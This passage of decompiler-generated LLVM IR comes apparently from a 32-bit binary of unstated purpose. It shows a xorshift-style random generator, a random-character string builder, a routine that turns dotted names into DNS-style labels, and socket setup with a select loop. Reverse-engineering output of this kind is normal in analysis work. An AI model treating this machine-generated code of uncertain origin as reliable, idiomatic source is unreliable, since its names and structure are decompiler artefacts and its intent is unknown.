dec_label_pc_8048bb2:                             ; preds = %dec_label_pc_8048b6e, %dec_label_pc_8048b53, %dec_label_pc_8048bb0
  %v0_8048bb7 = phi i32 [ 1, %dec_label_pc_8048b6e ], [ %v2_8048b66, %dec_label_pc_8048b53 ], [ 0, %dec_label_pc_8048bb0 ]
  ret i32 %v0_8048bb7

; uselistorder directives
  uselistorder i32 %v3_8048a89, { 1, 2, 0 }
  uselistorder i8 %stack_var_-41.0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048bb2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048bb0, { 1, 0 }
  uselistorder label %dec_label_pc_8048af7, { 1, 0 }
}

define i32 @function_80490fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_80490fc:
  %v0_80490fc = load i32, i32* @global_var_804f68c.39, align 4
  %v0_8049102 = load i32, i32* @global_var_804f698.40, align 8
  %v2_804910a = mul i32 %v0_80490fc, 2048
  %v2_804910f = xor i32 %v2_804910a, %v0_80490fc
  %v0_8049111 = load i32, i32* @global_var_804f690.41, align 16
  %v2_8049116 = udiv i32 %v0_8049102, 524288
  store i32 %v2_8049116, i32* @ecx, align 4
  store i32 %v0_8049111, i32* @global_var_804f68c.39, align 4
  %v0_804911e = load i32, i32* @global_var_804f694.42, align 4
  store i32 %v0_8049102, i32* @global_var_804f694.42, align 4
  %v2_8049129 = xor i32 %v2_8049116, %v0_8049102
  store i32 %v0_804911e, i32* @global_var_804f690.41, align 16
  %v2_8049134 = udiv i32 %v2_804910f, 256
  %v2_8049132 = xor i32 %v2_8049134, %v2_804910f
  %v2_8049137 = xor i32 %v2_8049132, %v2_8049129
  store i32 %v2_8049137, i32* @global_var_804f698.40, align 8
  ret i32 %v2_8049137

; uselistorder directives
  uselistorder i32 %v2_8049116, { 1, 0 }
  uselistorder i32 %v2_804910f, { 1, 0 }
  uselistorder i32 %v0_8049102, { 1, 2, 0 }
  uselistorder i32 %v0_80490fc, { 1, 0 }
}

define i32 @function_8049140(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049140:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8049142 = load i32, i32* @ebx, align 4
  store i32 %v0_8049142, i32* %stack_var_-12, align 4
  %v1_804917a13 = add i32 %arg2, -1
  store i32 %v1_804917a13, i32* %esi.global-to-local, align 4
  %v1_804917b14 = add i32 %arg1, 1
  store i32 %v1_804917b14, i32* %edi.global-to-local, align 4
  %v10_804917c15 = icmp eq i32 %arg2, 0
  %v1_804917f16 = icmp eq i1 %v10_804917c15, false
  br i1 %v1_804917f16, label %dec_label_pc_8049150, label %dec_label_pc_8049181

dec_label_pc_8049150:                             ; preds = %dec_label_pc_8049140, %dec_label_pc_8049150.dec_label_pc_8049150_crit_edge
  %v0_8049150 = phi i32 [ %v0_8049150.pre, %dec_label_pc_8049150.dec_label_pc_8049150_crit_edge ], [ %v0_8049142, %dec_label_pc_8049140 ]
  %v1_8049150 = call i32 @function_80490fc(i32 %v0_8049150)
  %v2_804915f = call i32 @function_804a688(i32 ptrtoint ([27 x i8]* @global_var_804f5ec.43 to i32))
  store i32 %v2_804915f, i32* @ecx, align 4
  %tmp12 = urem i32 %v1_8049150, %v2_804915f
  %v1_8049171 = add i32 %tmp12, ptrtoint ([27 x i8]* @global_var_804f5ec.43 to i32)
  %v2_8049171 = inttoptr i32 %v1_8049171 to i8*
  %v3_8049171 = load i8, i8* %v2_8049171, align 1
  %v3_8049177 = load i32, i32* %edi.global-to-local, align 4
  %v4_8049177 = add i32 %v3_8049177, -1
  %v5_8049177 = inttoptr i32 %v4_8049177 to i8*
  store i8 %v3_8049171, i8* %v5_8049177, align 1
  %v0_804917a.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804917b.pre = load i32, i32* %edi.global-to-local, align 4
  %v1_804917a = add i32 %v0_804917a.pre, -1
  store i32 %v1_804917a, i32* %esi.global-to-local, align 4
  %v1_804917b = add i32 %v0_804917b.pre, 1
  store i32 %v1_804917b, i32* %edi.global-to-local, align 4
  %v10_804917c = icmp eq i32 %v0_804917a.pre, 0
  %v1_804917f = icmp eq i1 %v10_804917c, false
  br i1 %v1_804917f, label %dec_label_pc_8049150.dec_label_pc_8049150_crit_edge, label %dec_label_pc_804917a.dec_label_pc_8049181_crit_edge

dec_label_pc_8049150.dec_label_pc_8049150_crit_edge: ; preds = %dec_label_pc_8049150
  %v0_8049150.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8049150

dec_label_pc_804917a.dec_label_pc_8049181_crit_edge: ; preds = %dec_label_pc_8049150
  %phitmp.le = sext i8 %v3_8049171 to i32
  %v2_8049184.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8049181

dec_label_pc_8049181:                             ; preds = %dec_label_pc_804917a.dec_label_pc_8049181_crit_edge, %dec_label_pc_8049140
  %v2_8049184 = phi i32 [ %v2_8049184.pre, %dec_label_pc_804917a.dec_label_pc_8049181_crit_edge ], [ %v0_8049142, %dec_label_pc_8049140 ]
  %.0.lcssa = phi i32 [ %phitmp.le, %dec_label_pc_804917a.dec_label_pc_8049181_crit_edge ], [ 0, %dec_label_pc_8049140 ]
  store i32 %v2_8049184, i32* @ebx, align 4
  ret i32 %.0.lcssa

; uselistorder directives
  uselistorder i32 %v0_804917a.pre, { 1, 0 }
  uselistorder i32 %v0_8049142, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edi.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([27 x i8]* @global_var_804f5ec.43 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8049150, { 1, 0 }
}

define i32 @function_8049188() local_unnamed_addr {
dec_label_pc_8049188:
  %v0_8049188 = load i32, i32* @ebx, align 4
  %v2_804918e = call i32 @function_804b0b9(i32* null)
  store i32 %v2_804918e, i32* @global_var_804f68c.39, align 4
  %v0_8049198 = call i32 @function_804aeed()
  store i32 %v0_8049198, i32* @ebx, align 4
  %v0_804919f = call i32 @function_804af13()
  %v0_80491a4 = load i32, i32* @ebx, align 4
  %v2_80491a4 = xor i32 %v0_80491a4, %v0_804919f
  store i32 %v2_80491a4, i32* @ebx, align 4
  store i32 %v2_80491a4, i32* @global_var_804f690.41, align 16
  %v0_80491ac = call i32 @function_804b336()
  store i32 %v0_80491ac, i32* @global_var_804f694.42, align 4
  %v1_80491b6 = load i32, i32* @global_var_804f690.41, align 16
  %v2_80491b6 = xor i32 %v1_80491b6, %v0_80491ac
  store i32 %v2_80491b6, i32* @global_var_804f698.40, align 8
  store i32 %v0_8049188, i32* @ebx, align 4
  ret i32 %v2_80491b6
}

define i32 @function_80491c6(i32 %arg1) local_unnamed_addr {
dec_label_pc_80491c6:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-2204 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %ebp.global-to-local, align 4
  %v2_80491db = ptrtoint i32* %stack_var_-2204 to i32
  store i32 %v2_80491db, i32* %eax.global-to-local, align 4
  %v2_80491ea = call i32 @function_804a688(i32 %v2_80491db)
  store i32 %v2_80491ea, i32* %eax.global-to-local, align 4
  %v1_80491f3 = call i32 @function_804a9ae(i32 %v2_80491ea)
  store i32 %v1_80491f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80491db, i32* %edi.global-to-local, align 4
  %v0_804923214 = load i32, i32* @ebx, align 4
  %v5_804923623 = icmp slt i32 %v0_804923214, %v2_80491ea
  br i1 %v5_804923623, label %dec_label_pc_8049205, label %dec_label_pc_8049238

dec_label_pc_8049205:                             ; preds = %dec_label_pc_80491c6, %dec_label_pc_8049231
  %v2_8049217 = phi i32 [ %v2_804921728, %dec_label_pc_8049231 ], [ %v2_80491db, %dec_label_pc_80491c6 ]
  %v0_804920d = phi i32 [ %v1_8049231, %dec_label_pc_8049231 ], [ %v0_804923214, %dec_label_pc_80491c6 ]
  %v1_8049205 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8049205 = add i32 %v1_8049205, %v0_804920d
  %v3_8049205 = inttoptr i32 %v2_8049205 to i8*
  %v4_8049205 = load i8, i8* %v3_8049205, align 1
  %v13_8049205 = icmp eq i8 %v4_8049205, 46
  %v1_8049209 = icmp eq i1 %v13_8049205, false
  br i1 %v1_8049209, label %dec_label_pc_8049231, label %dec_label_pc_804920b

dec_label_pc_804920b:                             ; preds = %dec_label_pc_8049205
  %v0_804920b = load i32, i32* %esi.global-to-local, align 4
  %v1_804920f = trunc i32 %v0_804920d to i8
  %v3_804920f = trunc i32 %v0_804920b to i8
  %v4_804920f = sub i8 %v1_804920f, %v3_804920f
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8049213 = add i32 %v0_804920b, %v1_8049205
  store i32 %v2_8049213, i32* %edx.global-to-local, align 4
  %v3_8049217 = inttoptr i32 %v2_8049217 to i8*
  store i8 %v4_804920f, i8* %v3_8049217, align 1
  %v1_8049223.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804922367 = load i32, i32* %esi.global-to-local, align 4
  %v2_804922368 = add i32 %v0_804922367, %v1_8049223.pre
  store i32 %v2_804922368, i32* %eax.global-to-local, align 4
  %v1_804922669 = load i32, i32* @ebx, align 4
  %v5_804922871 = icmp slt i32 %v2_804922368, %v1_804922669
  br i1 %v5_804922871, label %dec_label_pc_804921b, label %dec_label_pc_804922a

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920b, %dec_label_pc_804921b
  %v2_804921e72 = phi i32 [ %v1_8049222, %dec_label_pc_804921b ], [ %v1_8049223.pre, %dec_label_pc_804920b ]
  %v0_804921b = load i32, i32* %edx.global-to-local, align 4
  %v1_804921b = inttoptr i32 %v0_804921b to i8*
  %v2_804921b = load i8, i8* %v1_804921b, align 1
  %v1_804921d = add i32 %v0_804921b, 1
  store i32 %v1_804921d, i32* %edx.global-to-local, align 4
  %v3_804921e = load i32, i32* %edi.global-to-local, align 4
  %v4_804921e = add i32 %v2_804921e72, 1
  %v5_804921e = add i32 %v4_804921e, %v3_804921e
  %v6_804921e = inttoptr i32 %v5_804921e to i8*
  store i8 %v2_804921b, i8* %v6_804921e, align 1
  %v0_8049222 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049222 = add i32 %v0_8049222, 1
  store i32 %v1_8049222, i32* %ecx.global-to-local, align 4
  %v0_8049223 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049223 = add i32 %v0_8049223, %v1_8049222
  store i32 %v2_8049223, i32* %eax.global-to-local, align 4
  %v1_8049226 = load i32, i32* @ebx, align 4
  %v5_8049228 = icmp slt i32 %v2_8049223, %v1_8049226
  br i1 %v5_8049228, label %dec_label_pc_804921b, label %dec_label_pc_804922a

dec_label_pc_804922a:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804920b
  %v2_804921e.lcssa = phi i32 [ %v1_8049223.pre, %dec_label_pc_804920b ], [ %v1_8049222, %dec_label_pc_804921b ]
  %v2_8049223.lcssa = phi i32 [ %v2_804922368, %dec_label_pc_804920b ], [ %v2_8049223, %dec_label_pc_804921b ]
  %v1_8049226.lcssa = phi i32 [ %v1_804922669, %dec_label_pc_804920b ], [ %v1_8049226, %dec_label_pc_804921b ]
  %v0_804922a = load i32, i32* %edi.global-to-local, align 4
  %v2_804922a = add i32 %v2_804921e.lcssa, 1
  %v3_804922a = add i32 %v2_804922a, %v0_804922a
  store i32 %v3_804922a, i32* %edi.global-to-local, align 4
  %v1_804922e = add i32 %v2_8049223.lcssa, 1
  store i32 %v1_804922e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049231

dec_label_pc_8049231:                             ; preds = %dec_label_pc_8049205, %dec_label_pc_804922a
  %v0_8049231 = phi i32 [ %v0_804920d, %dec_label_pc_8049205 ], [ %v1_8049226.lcssa, %dec_label_pc_804922a ]
  %v2_804921728 = phi i32 [ %v2_8049217, %dec_label_pc_8049205 ], [ %v3_804922a, %dec_label_pc_804922a ]
  %v1_8049231 = add i32 %v0_8049231, 1
  store i32 %v1_8049231, i32* @ebx, align 4
  %v5_8049236 = icmp slt i32 %v1_8049231, %v2_80491ea
  br i1 %v5_8049236, label %dec_label_pc_8049205, label %dec_label_pc_8049238

dec_label_pc_8049238:                             ; preds = %dec_label_pc_8049231, %dec_label_pc_80491c6
  store i32 %v2_80491db, i32* %ecx.global-to-local, align 4
  store i32 %v2_80491ea, i32* %edi.global-to-local, align 4
  %v2_8049240 = add i32 %v2_80491ea, %v2_80491db
  %v3_8049240 = inttoptr i32 %v2_8049240 to i8*
  store i8 0, i8* %v3_8049240, align 1
  %v1_8049244 = call i32 @function_80490fc(i32 %v1_80491f3)
  %v2_8049244 = sext i32 %v1_8049244 to i64
  store i32 65535, i32* %ecx.global-to-local, align 4
  %v9_8049252 = udiv i64 %v2_8049244, 65535
  %v10_8049252 = trunc i64 %v9_8049252 to i32
  store i32 %v10_8049252, i32* %eax.global-to-local, align 4
  %v11_8049252 = urem i64 %v2_8049244, 65535
  %v12_8049252 = trunc i64 %v11_8049252 to i32
  store i32 %v12_8049252, i32* %edx.global-to-local, align 4
  %v1_8049262 = call i32 @function_804a688(i32 %v2_80491db)
  store i32 %v2_80491db, i32* %eax.global-to-local, align 4
  %v1_8049273 = call i32 @function_804a688(i32 %v2_80491db)
  store i32 %v1_8049273, i32* %eax.global-to-local, align 4
  store i32 %v2_80491db, i32* @edi, align 4
  %v2_8049283 = add i32 %v1_8049273, %v2_80491db
  store i32 %v2_8049283, i32* @esi, align 4
  %v3_8049287 = call i32 @function_804be6a(i64 1, i32 2054)
  store i32 %v1_80491f3, i32* @edi, align 4
  %v0_8049290 = load i32, i32* @esi, align 4
  %v1_8049290 = add i32 %v0_8049290, 1
  store i32 %v1_8049290, i32* @ebx, align 4
  store i32 %v3_8049287, i32* @ebp, align 4
  %sext = mul nuw i32 %v12_8049252, 65536
  %v4_80492c4 = sdiv i32 %sext, 65536
  store i32 %v4_80492c4, i32* %eax.global-to-local, align 4
  %v2_80492e3 = inttoptr i32 %v1_8049290 to i16*
  store i16 4096, i16* %v2_80492e3, align 2
  %v0_80492e9 = load i32, i32* @ebx, align 4
  %v1_80492e9 = add i32 %v0_80492e9, 2
  %v2_80492e9 = inttoptr i32 %v1_80492e9 to i16*
  store i16 256, i16* %v2_80492e9, align 2
  br label %dec_label_pc_80492ef

dec_label_pc_80492ef:                             ; preds = %dec_label_pc_804954c, %dec_label_pc_8049238
  %v0_80492ef = load i32, i32* @esp, align 4
  %v1_80492ef = add i32 %v0_80492ef, 28
  %v2_80492ef = inttoptr i32 %v1_80492ef to i32*
  %v3_80492ef = load i32, i32* %v2_80492ef, align 4
  %v13_80492ef = icmp eq i32 %v3_80492ef, -1
  br i1 %v13_80492ef, label %dec_label_pc_8049305, label %dec_label_pc_80492f6

dec_label_pc_80492f6:                             ; preds = %dec_label_pc_80492ef
  %v3_80492f9 = load i32, i32* %v2_80492ef, align 4
  %v5_80492f9 = add i32 %v0_80492ef, -16
  %v6_80492f9 = inttoptr i32 %v5_80492f9 to i32*
  store i32 %v3_80492f9, i32* %v6_80492f9, align 4
  %v2_80492fd = call i32 @function_804ae74(i32 %v4_80492c4)
  store i32 %v2_80492fd, i32* %eax.global-to-local, align 4
  %v0_8049302 = load i32, i32* @esp, align 4
  %v1_8049302 = add i32 %v0_8049302, 16
  br label %dec_label_pc_8049305

dec_label_pc_8049305:                             ; preds = %dec_label_pc_80492ef, %dec_label_pc_80492f6
  %v1_8049305 = phi i32 [ %v0_80492ef, %dec_label_pc_80492ef ], [ %v1_8049302, %dec_label_pc_80492f6 ]
  %v0_8049305 = load i32, i32* @ecx, align 4
  %v2_8049305 = add i32 %v1_8049305, -4
  %v3_8049305 = inttoptr i32 %v2_8049305 to i32*
  store i32 %v0_8049305, i32* %v3_8049305, align 4
  %v1_8049306 = add i32 %v1_8049305, -8
  %v2_8049306 = inttoptr i32 %v1_8049306 to i32*
  store i32 0, i32* %v2_8049306, align 4
  %v1_8049308 = add i32 %v1_8049305, -12
  %v2_8049308 = inttoptr i32 %v1_8049308 to i32*
  store i32 2, i32* %v2_8049308, align 4
  %v1_804930a = add i32 %v1_8049305, -16
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  store i32 2, i32* %v2_804930a, align 4
  %v5_804930c = call i32 @function_804b584(i32 %v4_80492c4, i32 256, i32 ptrtoint (i32* @0 to i32))
  %v1_8049311 = load i32, i32* @esp, align 4
  %v2_8049311 = add i32 %v1_8049311, 44
  %v3_8049311 = inttoptr i32 %v2_8049311 to i32*
  store i32 %v5_804930c, i32* %v3_8049311, align 4
  %v0_8049315 = load i32, i32* @esp, align 4
  %v1_8049318 = add i32 %v5_804930c, 1
  %v8_8049318 = icmp eq i32 %v1_8049318, 0
  store i32 %v1_8049318, i32* %eax.global-to-local, align 4
  br i1 %v8_8049318, label %dec_label_pc_8049358, label %dec_label_pc_804931b

dec_label_pc_804931b:                             ; preds = %dec_label_pc_8049305
  %v1_804931b = add i32 %v0_8049315, 4292
  store i32 %v1_804931b, i32* %eax.global-to-local, align 4
  %v0_8049322 = load i32, i32* @edx, align 4
  %v2_8049322 = add i32 %v0_8049315, 12
  %v3_8049322 = inttoptr i32 %v2_8049322 to i32*
  store i32 %v0_8049322, i32* %v3_8049322, align 4
  %v1_8049323 = add i32 %v0_8049315, 8
  %v2_8049323 = inttoptr i32 %v1_8049323 to i32*
  store i32 16, i32* %v2_8049323, align 4
  %v0_8049325 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049325 = add i32 %v0_8049315, 4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v1_8049326 = add i32 %v0_8049315, 44
  %v2_8049326 = inttoptr i32 %v1_8049326 to i32*
  %v3_8049326 = load i32, i32* %v2_8049326, align 4
  %v6_8049326 = inttoptr i32 %v0_8049315 to i32*
  store i32 %v3_8049326, i32* %v6_8049326, align 4
  %v6_804932a = call i32 @function_804b3ec(i32 %v4_80492c4, i32 256, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804932f = load i32, i32* @esp, align 4
  %v1_8049332 = add i32 %v6_804932a, 1
  %v8_8049332 = icmp eq i32 %v1_8049332, 0
  store i32 %v1_8049332, i32* %eax.global-to-local, align 4
  br i1 %v8_8049332, label %dec_label_pc_8049358, label %dec_label_pc_8049335

dec_label_pc_8049335:                             ; preds = %dec_label_pc_804931b
  %v1_8049335 = add i32 %v0_804932f, 12
  %v2_8049335 = inttoptr i32 %v1_8049335 to i32*
  store i32 16384, i32* %v2_8049335, align 4
  %v1_804933a = add i32 %v0_804932f, 40
  %v2_804933a = inttoptr i32 %v1_804933a to i32*
  %v3_804933a = load i32, i32* %v2_804933a, align 4
  %v5_804933a = add i32 %v0_804932f, 8
  %v6_804933a = inttoptr i32 %v5_804933a to i32*
  store i32 %v3_804933a, i32* %v6_804933a, align 4
  %v1_804933e = add i32 %v0_804932f, 2116
  store i32 %v1_804933e, i32* %eax.global-to-local, align 4
  %v2_8049345 = add i32 %v0_804932f, 4
  %v3_8049345 = inttoptr i32 %v2_8049345 to i32*
  store i32 %v1_804933e, i32* %v3_8049345, align 4
  %v1_8049346 = add i32 %v0_804932f, 44
  %v2_8049346 = inttoptr i32 %v1_8049346 to i32*
  %v3_8049346 = load i32, i32* %v2_8049346, align 4
  %v6_8049346 = inttoptr i32 %v0_804932f to i32*
  store i32 %v3_8049346, i32* %v6_8049346, align 4
  %v0_804934a = call i32 @function_804b516()
  store i32 %v0_804934a, i32* %eax.global-to-local, align 4
  %v0_804934f = load i32, i32* @esp, align 4
  %v2_8049352 = add i32 %v0_804934f, 40
  %v3_8049352 = inttoptr i32 %v2_8049352 to i32*
  %v4_8049352 = load i32, i32* %v3_8049352, align 4
  %v15_8049352 = icmp eq i32 %v0_804934a, %v4_8049352
  br i1 %v15_8049352, label %dec_label_pc_804936a, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049335, %dec_label_pc_804931b, %dec_label_pc_8049305
  %v0_8049358.in = phi i32 [ %v0_804934f, %dec_label_pc_8049335 ], [ %v0_804932f, %dec_label_pc_804931b ], [ %v0_8049315, %dec_label_pc_8049305 ]
  %v2_804935b = inttoptr i32 %v0_8049358.in to i32*
  store i32 1, i32* %v2_804935b, align 4
  %v2_804935d = call i32 @function_804c4a7(i32 %v4_80492c4)
  store i32 %v2_804935d, i32* %eax.global-to-local, align 4
  %v0_8049362 = load i32, i32* @esp, align 4
  %v1_8049362 = add i32 %v0_8049362, 16
  br label %dec_label_pc_804954c

dec_label_pc_804936a:                             ; preds = %dec_label_pc_8049335
  %v2_804936a = add i32 %v0_804934f, 12
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804934a, i32* %v3_804936a, align 4
  %v1_804936b = add i32 %v0_804934f, 8
  %v2_804936b = inttoptr i32 %v1_804936b to i32*
  store i32 0, i32* %v2_804936b, align 4
  %v1_804936d = add i32 %v0_804934f, 4
  %v2_804936d = inttoptr i32 %v1_804936d to i32*
  store i32 3, i32* %v2_804936d, align 4
  %v1_804936f = add i32 %v0_804934f, 44
  %v2_804936f = inttoptr i32 %v1_804936f to i32*
  %v3_804936f = load i32, i32* %v2_804936f, align 4
  %v6_804936f = inttoptr i32 %v0_804934f to i32*
  store i32 %v3_804936f, i32* %v6_804936f, align 4
  %v5_8049373 = call i32 @function_804adb0(i32 %v4_80492c4, i32 256, i32 ptrtoint (i32* @0 to i32))
  %v0_8049378 = load i32, i32* @esp, align 4
  %v12_804937b = or i32 %v5_8049373, 2048
  store i32 %v12_804937b, i32* %eax.global-to-local, align 4
  %v2_804937e = add i32 %v0_8049378, 8
  %v3_804937e = inttoptr i32 %v2_804937e to i32*
  store i32 %v12_804937b, i32* %v3_804937e, align 4
  %v1_804937f = add i32 %v0_8049378, 4
  %v2_804937f = inttoptr i32 %v1_804937f to i32*
  store i32 4, i32* %v2_804937f, align 4
  %v1_8049381 = add i32 %v0_8049378, 44
  %v2_8049381 = inttoptr i32 %v1_8049381 to i32*
  %v3_8049381 = load i32, i32* %v2_8049381, align 4
  %v6_8049381 = inttoptr i32 %v0_8049378 to i32*
  store i32 %v3_8049381, i32* %v6_8049381, align 4
  %v5_8049385 = call i32 @function_804adb0(i32 %v4_80492c4, i32 256, i32 ptrtoint (i32* @0 to i32))
  %v0_804938a = load i32, i32* @esp, align 4
  %v1_804938a = add i32 %v0_804938a, 4164
  store i32 %v1_804938a, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_8049398 = inttoptr i32 %v1_804938a to i8*
  store i32 %v1_804938a, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804939b = call i8* @_memset(i8* %v1_8049398, i32 0, i32 32)
  %v6_804939b = ptrtoint i8* %v5_804939b to i32
  store i32 %v6_804939b, i32* %ecx.global-to-local, align 4
  %v0_804939d = load i32, i32* @esp, align 4
  %v1_804939d = add i32 %v0_804939d, 44
  %v2_804939d = inttoptr i32 %v1_804939d to i32*
  %v3_804939d = load i32, i32* %v2_804939d, align 4
  store i32 %v3_804939d, i32* %esi.global-to-local, align 4
  %v3_80493a1 = load i32, i32* %v2_804939d, align 4
  %v2_80493a5 = udiv i32 %v3_804939d, 32
  store i32 %v2_80493a5, i32* @esi, align 4
  %v1_80493a8 = urem i32 %v3_80493a1, 32
  store i32 %v1_80493a8, i32* @ebx, align 4
  %v2_80493ab = mul nuw nsw i32 %v2_80493a5, 4
  %v3_80493ab = add i32 %v0_804939d, 4164
  %v4_80493ab = add i32 %v3_80493ab, %v2_80493ab
  %v5_80493ab = inttoptr i32 %v4_80493ab to i32*
  %v6_80493ab = load i32, i32* %v5_80493ab, align 4
  %v9_80493ab = shl i32 1, %v1_80493a8
  %v12_80493ab = or i32 %v6_80493ab, %v9_80493ab
  store i32 %v12_80493ab, i32* %v5_80493ab, align 4
  %v0_80493b3 = load i32, i32* @esp, align 4
  %v1_80493b3 = add i32 %v0_80493b3, 4308
  %v2_80493b3 = inttoptr i32 %v1_80493b3 to i32*
  store i32 10, i32* %v2_80493b3, align 4
  %v0_80493be = load i32, i32* @esp, align 4
  %v1_80493be = add i32 %v0_80493be, 4312
  %v2_80493be = inttoptr i32 %v1_80493be to i32*
  store i32 0, i32* %v2_80493be, align 4
  %v0_80493c9 = load i32, i32* @esp, align 4
  %v1_80493c9 = inttoptr i32 %v0_80493c9 to i32*
  %v1_80493ca = add i32 %v0_80493c9, 4308
  store i32 %v1_80493ca, i32* %eax.global-to-local, align 4
  store i32 %v1_80493ca, i32* %v1_80493c9, align 4
  %v1_80493d2 = add i32 %v0_80493c9, -4
  %v2_80493d2 = inttoptr i32 %v1_80493d2 to i32*
  store i32 0, i32* %v2_80493d2, align 4
  %v1_80493d4 = add i32 %v0_80493c9, -8
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v0_80493d6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80493d6 = add i32 %v0_80493c9, -12
  %v3_80493d6 = inttoptr i32 %v2_80493d6 to i32*
  store i32 %v0_80493d6, i32* %v3_80493d6, align 4
  %v1_80493d7 = add i32 %v0_80493c9, 44
  %v2_80493d7 = inttoptr i32 %v1_80493d7 to i32*
  %v3_80493d7 = load i32, i32* %v2_80493d7, align 4
  %v1_80493db = add i32 %v3_80493d7, 1
  store i32 %v1_80493db, i32* %eax.global-to-local, align 4
  %v2_80493dc = add i32 %v0_80493c9, -16
  %v3_80493dc = inttoptr i32 %v2_80493dc to i32*
  store i32 %v1_80493db, i32* %v3_80493dc, align 4
  %v7_80493dd = call i32 @function_804b054(i32 %v4_80492c4, i32 256, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_80493dd, i32* @eax, align 4
  %v0_80493e2 = load i32, i32* @esp, align 4
  %v1_80493e2 = add i32 %v0_80493e2, 32
  %v10_80493e5 = icmp eq i32 %v7_80493dd, -1
  br i1 %v10_80493e5, label %dec_label_pc_8049563, label %dec_label_pc_80493ee

dec_label_pc_80493ee:                             ; preds = %dec_label_pc_804936a
  %v1_80493ee = icmp eq i32 %v7_80493dd, 0
  br i1 %v1_80493ee, label %dec_label_pc_804954c, label %dec_label_pc_80493f6

dec_label_pc_80493f6:                             ; preds = %dec_label_pc_80493ee
  %v1_80493f6 = load i32, i32* @esi, align 4
  %v2_80493f6 = mul i32 %v1_80493f6, 4
  %v3_80493f6 = add i32 %v0_80493e2, 4180
  %v4_80493f6 = add i32 %v3_80493f6, %v2_80493f6
  %v5_80493f6 = inttoptr i32 %v4_80493f6 to i32*
  %v6_80493f6 = load i32, i32* %v5_80493f6, align 4
  %v7_80493f6 = load i32, i32* @ebx, align 4
  %v8_80493f6 = urem i32 %v7_80493f6, 32
  %v9_80493f6 = shl i32 1, %v8_80493f6
  %v10_80493f6 = and i32 %v9_80493f6, %v6_80493f6
  %v11_80493f6 = icmp ne i32 %v10_80493f6, 0
  %v1_80493fe = zext i1 %v11_80493f6 to i32
  %v3_80493fe = and i32 %v7_80493dd, -256
  %v4_80493fe = or i32 %v1_80493fe, %v3_80493fe
  store i32 %v4_80493fe, i32* %eax.global-to-local, align 4
  %v4_8049401 = icmp eq i1 %v11_80493f6, false
  br i1 %v4_8049401, label %dec_label_pc_804954c, label %dec_label_pc_8049409

dec_label_pc_8049409:                             ; preds = %dec_label_pc_80493f6
  %v3_8049409 = add i32 %v0_80493e2, 28
  %v4_8049409 = inttoptr i32 %v3_8049409 to i32*
  store i32 %v1_804938a, i32* %v4_8049409, align 4
  %v1_804940a = add i32 %v0_80493e2, 24
  %v2_804940a = inttoptr i32 %v1_804940a to i32*
  store i32 2048, i32* %v2_804940a, align 4
  %v1_804940f = add i32 %v0_80493e2, 20
  %v2_804940f = inttoptr i32 %v1_804940f to i32*
  store i32 0, i32* %v2_804940f, align 4
  %v1_8049411 = add i32 %v0_80493e2, 84
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v2_8049415 = add i32 %v0_80493e2, 16
  %v3_8049415 = inttoptr i32 %v2_8049415 to i32*
  store i32 %v1_8049411, i32* %v3_8049415, align 4
  %v6_8049416 = call i32 @function_804a6fc(i32 %v4_80492c4, i8 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8049416, i32* %eax.global-to-local, align 4
  %v0_804941b = load i32, i32* @esp, align 4
  %v1_804941b = inttoptr i32 %v0_804941b to i32*
  %v2_804941b = load i32, i32* %v1_804941b, align 4
  store i32 %v2_804941b, i32* @ebx, align 4
  %v3_804941b = add i32 %v0_804941b, 4
  %v1_804941c = inttoptr i32 %v3_804941b to i32*
  %v2_804941c = load i32, i32* %v1_804941c, align 4
  store i32 %v2_804941c, i32* @esi, align 4
  store i32 0, i32* %v1_804941c, align 4
  store i32 0, i32* %v1_804941b, align 4
  %v1_8049421 = add i32 %v0_804941b, -4
  %v2_8049421 = inttoptr i32 %v1_8049421 to i32*
  store i32 16384, i32* %v2_8049421, align 4
  %v1_8049426 = add i32 %v0_804941b, -8
